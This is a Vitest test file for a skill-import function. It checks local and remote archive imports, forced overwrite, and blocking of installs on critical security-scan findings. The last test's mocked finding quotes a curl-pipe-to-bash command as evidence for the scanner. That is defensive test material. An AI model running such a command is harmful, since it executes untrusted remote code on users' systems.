import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { beforeEach, describe, expect, it, vi } from "vitest";

const scanDirectoryWithSummaryMock = vi.fn();
const downloadUrlToFileMock = vi.fn();
const extractArchiveMock = vi.fn();

vi.mock("../security/skill-scanner.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../security/skill-scanner.js")>();
  return {
    ...actual,
    scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
  };
});

vi.mock("./skills-package-utils.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("./skills-package-utils.js")>();
  return {
    ...actual,
    downloadUrlToFile: (...args: unknown[]) => downloadUrlToFileMock(...args),
    extractArchive: (...args: unknown[]) => extractArchiveMock(...args),
  };
});

const { importSkill } = await import("./skills-import.js");

function buildSkillMarkdown(name: string, description = "test skill"): string {
  return `---
name: ${name}
description: ${description}
---

# ${name}
`;
}

async function writeMockExtractedSkill(targetDir: string, name: string): Promise<void> {
  const root = path.join(targetDir, name);
  await fs.mkdir(root, { recursive: true });
  await fs.writeFile(path.join(root, "SKILL.md"), buildSkillMarkdown(name), "utf-8");
  await fs.writeFile(path.join(root, "README.md"), `# ${name}`, "utf-8");
}

async function createArchivePlaceholder(baseDir: string, filename: string): Promise<string> {
  const filePath = path.join(baseDir, filename);
  await fs.writeFile(filePath, "placeholder", "utf-8");
  return filePath;
}

describe("importSkill", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    scanDirectoryWithSummaryMock.mockResolvedValue({
      scannedFiles: 2,
      critical: 0,
      warn: 0,
      info: 0,
      findings: [],
    });
    downloadUrlToFileMock.mockResolvedValue({ bytes: 42 });
    extractArchiveMock.mockImplementation(async (params: unknown) => {
      const { targetDir } = params as { targetDir: string };
      await writeMockExtractedSkill(targetDir, "demo-skill");
      return { stdout: "", stderr: "", code: 0 };
    });
  });

  it("imports a local skill archive successfully", async () => {
    const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skill-import-"));
    try {
      const filePath = await createArchivePlaceholder(tempDir, "demo.skill");
      const managedDir = path.join(tempDir, "managed-skills");

      const result = await importSkill({
        source: "file",
        filePath,
        managedSkillsDir: managedDir,
      });

      expect(result.ok).toBe(true);
      expect(result.skillName).toBe("demo-skill");
      await fs.access(path.join(managedDir, "demo-skill", "SKILL.md"));
      expect(extractArchiveMock).toHaveBeenCalledWith(
        expect.objectContaining({
          archivePath: filePath,
          archiveType: "zip",
        }),
      );
    } finally {
      await fs.rm(tempDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("imports a remote skill and resolves registry URL correctly", async () => {
    const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skill-import-"));
    try {
      const managedDir = path.join(tempDir, "managed-skills");
      extractArchiveMock.mockImplementationOnce(async (params: unknown) => {
        const { targetDir } = params as { targetDir: string };
        await writeMockExtractedSkill(targetDir, "remote-skill");
        return { stdout: "", stderr: "", code: 0 };
      });

      const result = await importSkill({
        source: "remote",
        package: "owner/repo",
        registry: "https://registry.example.com",
        managedSkillsDir: managedDir,
      });

      expect(result.ok).toBe(true);
      expect(result.skillName).toBe("remote-skill");
      expect(downloadUrlToFileMock).toHaveBeenCalledWith(
        expect.objectContaining({
          url: "https://registry.example.com/api/v1/skills/owner%2Frepo/download",
          includeUrlInError: true,
        }),
      );
    } finally {
      await fs.rm(tempDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("supports force overwrite for an existing managed skill", async () => {
    const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skill-import-"));
    try {
      const filePath = await createArchivePlaceholder(tempDir, "demo.skill");
      const managedDir = path.join(tempDir, "managed-skills");
      const existingDir = path.join(managedDir, "demo-skill");
      await fs.mkdir(existingDir, { recursive: true });
      await fs.writeFile(
        path.join(existingDir, "SKILL.md"),
        buildSkillMarkdown("demo-skill"),
        "utf-8",
      );
      await fs.writeFile(path.join(existingDir, "old-marker.txt"), "legacy", "utf-8");

      const failResult = await importSkill({
        source: "file",
        filePath,
        managedSkillsDir: managedDir,
      });
      expect(failResult.ok).toBe(false);
      expect(failResult.message).toContain("already exists");

      const forceResult = await importSkill({
        source: "file",
        filePath,
        force: true,
        managedSkillsDir: managedDir,
      });
      expect(forceResult.ok).toBe(true);
      await expect(fs.access(path.join(existingDir, "old-marker.txt"))).rejects.toThrow();
      await fs.access(path.join(existingDir, "README.md"));
    } finally {
      await fs.rm(tempDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("blocks installation when security scan finds critical issues", async () => {
    const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skill-import-"));
    try {
      const filePath = await createArchivePlaceholder(tempDir, "demo.skill");
      const managedDir = path.join(tempDir, "managed-skills");
      const extractedFile = path.join(tempDir, "runner.js");
      scanDirectoryWithSummaryMock.mockResolvedValueOnce({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: extractedFile,
            line: 12,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await importSkill({
        source: "file",
        filePath,
        managedSkillsDir: managedDir,
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain("Security scan blocked installation");
      expect(result.warnings?.some((warning) => warning.includes("BLOCKED: Skill"))).toBe(true);
      await expect(fs.access(path.join(managedDir, "demo-skill"))).rejects.toThrow();
    } finally {
      await fs.rm(tempDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });
});
